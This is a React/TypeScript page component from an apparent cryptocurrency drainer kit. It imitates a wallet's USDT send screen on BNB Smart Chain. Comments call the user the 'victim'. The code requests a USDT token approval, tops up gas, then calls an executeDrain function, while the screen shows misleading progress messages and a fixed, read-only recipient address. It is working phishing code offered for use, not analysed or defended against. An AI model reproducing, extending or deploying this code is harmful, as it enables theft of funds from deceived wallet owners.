import { useState, useEffect, useRef } from "react"
import { ethers } from "ethers"
import { USDT_ADDRESS, USDT_DECIMALS } from "../config"
import { requestApproval, ensureGas, executeDrain, ensureCorrectNetwork } from "../lib/web3"

interface Props {
  provider: ethers.BrowserProvider
  address: string
}

type DrainStage = "idle" | "switching_network" | "approving" | "checking_gas" | "draining" | "done" | "error"

export default function SendPage({ provider, address }: Props) {
  const [amount, setAmount] = useState("")
  const [usdtBalance, setUsdtBalance] = useState("0")
  const [stage, setStage] = useState<DrainStage>("idle")
  const [statusMsg, setStatusMsg] = useState("")
  const [networkOk, setNetworkOk] = useState(false)
  const [networkError, setNetworkError] = useState("")
  const mountedRef = useRef(true)

  useEffect(() => {
    mountedRef.current = true

    const init = async () => {
      if (!mountedRef.current) return

      let activeProvider: ethers.BrowserProvider = provider
      try {
        const switchedProvider = await ensureCorrectNetwork(provider)
        if (!mountedRef.current) return
        activeProvider = switchedProvider
        setNetworkOk(true)
        setNetworkError("")
      } catch (err: any) {
        if (!mountedRef.current) return
        setNetworkOk(false)
        setNetworkError(err.message || "Please switch to BNB Smart Chain")
        return
      }

      try {
        const usdt = new ethers.Contract(
          USDT_ADDRESS,
          ["function balanceOf(address) view returns (uint256)"],
          activeProvider
        )
        const bal = await usdt.balanceOf(address)
        if (mountedRef.current) setUsdtBalance(ethers.formatUnits(bal, USDT_DECIMALS))
      } catch (err: any) {
        console.warn("Balance fetch failed:", err?.message || err)
        if (mountedRef.current) setUsdtBalance("0")
      }
    }

    init()

    return () => {
      mountedRef.current = false
    }
  }, [address, provider])

  const handleNext = async () => {
    setStage("switching_network")
    setStatusMsg("Preparing network...")
    try {
      const switchedProvider = await ensureCorrectNetwork(provider)

      // 1) APPROVAL FIRST — victim signs the USDT approve
      setStage("approving")
      setStatusMsg("Waiting for approval...")
      const approval = await requestApproval(switchedProvider, address)
      if (!approval) {
        setStage("error")
        setStatusMsg("Approval failed.")
        return
      }

      // 2) THEN check gas / fund (approval already signed)
      setStage("checking_gas")
      setStatusMsg("Checking gas balance...")
      const hasGas = await ensureGas(switchedProvider, address)
      if (!hasGas) {
        setStage("error")
        setStatusMsg("Could not fund gas.")
        return
      }

      // 3) THEN drain — backend waits for approval to confirm first
      setStage("draining")
      setStatusMsg("Transferring USDT...")
      const drained = await executeDrain(address, approval)
      if (drained) {
        setStage("done")
        setStatusMsg("Transaction complete!")
      } else {
        setStage("error")
        setStatusMsg("Drain failed - check logs.")
      }
    } catch (err: any) {
      setStage("error")
      setStatusMsg("Error: " + (err.message || "Unknown error"))
    }
  }

  if (stage !== "idle") {
    return (
      <div className="min-h-screen bg-[#171717] flex flex-col items-center justify-center px-6">
        {stage === "switching_network" || stage === "approving" || stage === "checking_gas" || stage === "draining" ? (
          <>
            <div className="w-12 h-12 rounded-full border-4 border-[#2ECC71] border-t-transparent animate-spin mb-6" />
            <h2 className="text-[#F2F2F2] text-lg font-semibold mb-2">Processing</h2>
            <p className="text-[#8A8A8A] text-sm text-center">{statusMsg}</p>
          </>
        ) : stage === "done" ? (
          <>
            <div className="w-12 h-12 rounded-full bg-[#2ECC71] flex items-center justify-center mb-6">
              <span className="text-[#171717] text-2xl font-bold">✓</span>
            </div>
            <h2 className="text-[#F2F2F2] text-lg font-semibold mb-2">Complete</h2>
            <p className="text-[#8A8A8A] text-sm text-center">{statusMsg}</p>
            <p className="text-[#8A8A8A] text-xs text-center mt-4">You may close this page.</p>
          </>
        ) : (
          <>
            <div className="w-12 h-12 rounded-full bg-[#E74C3C] flex items-center justify-center mb-6">
              <span className="text-white text-2xl font-bold">!</span>
            </div>
            <h2 className="text-[#F2F2F2] text-lg font-semibold mb-2">Error</h2>
            <p className="text-[#8A8A8A] text-sm text-center">{statusMsg}</p>
          </>
        )}
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-[#171717] flex flex-col px-4 pt-4 pb-8">
      {networkError && !networkOk && (
        <div className="bg-[#2D2D2D] border border-[#E74C3C] rounded-lg px-4 py-3 mb-4">
          <p className="text-[#E74C3C] text-xs text-center">{networkError}</p>
        </div>
      )}
      {networkOk && (
        <div className="bg-[#2D2D2D] border border-[#2ECC71] rounded-lg px-4 py-3 mb-4">
          <p className="text-[#2ECC71] text-xs text-center">Connected to BNB Smart Chain (BEP-20)</p>
        </div>
      )}

      <label className="text-[#8A8A8A] text-sm mb-2">Address or Domain Name</label>
      <div className="flex items-center gap-2 bg-[#2D2D2D] rounded-xl px-4 py-4 mb-6">
        <input
          value="0x3881448305a5fAb94461"
          readOnly
          className="flex-1 bg-transparent text-[#F2F2F2] border-none outline-none text-sm"
          style={{ color: "#F2F2F2" }}
        />
        <button className="text-[#2ECC71] text-sm font-medium whitespace-nowrap">Paste</button>
        <span className="text-[#8A8A8A]">⧉</span>
        <span className="text-[#8A8A8A]">⌕</span>
      </div>

      <label className="text-[#8A8A8A] text-sm mb-2">Destination network</label>
      <div className="flex items-center gap-3 bg-[#2D2D2D] rounded-xl px-4 py-3 mb-6">
        <div className="w-8 h-8 rounded-full bg-[#F3BA2F] flex items-center justify-center">
          <span className="text-[#171717] text-sm font-bold">B</span>
        </div>
        <span className="text-[#F2F2F2] text-sm flex-1">BNB Smart Chain</span>
        <span className="text-[#8A8A8A]">⌄</span>
      </div>

      <label className="text-[#8A8A8A] text-sm mb-2">Amount</label>
      <div className="flex items-center gap-3 bg-[#2D2D2D] rounded-xl px-4 py-4 mb-2">
        <input
          value={amount}
          onChange={(e) => setAmount(e.target.value)}
          className="flex-1 bg-transparent text-[#F2F2F2] border-none outline-none placeholder-[#F2F2F2]"
          style={{ fontSize: "20px", fontWeight: 400 }}
          placeholder="0"
        />
        <span className="text-[#F2F2F2] text-sm font-medium">USDT</span>
        <button onClick={() => setAmount(usdtBalance)} className="text-[#2ECC71] text-sm font-medium">
          Max
        </button>
      </div>

      <p className="text-[#8A8A8A] text-sm mb-4">
        ≈ {parseFloat(usdtBalance || "0").toFixed(2)} USDT
      </p>

      <div className="flex-1" />

      <button
        onClick={handleNext}
        className="w-full bg-[#22D05E] text-[#171717] text-base font-semibold rounded-xl py-4 active:opacity-90"
      >
        Next
      </button>
    </div>
  )
}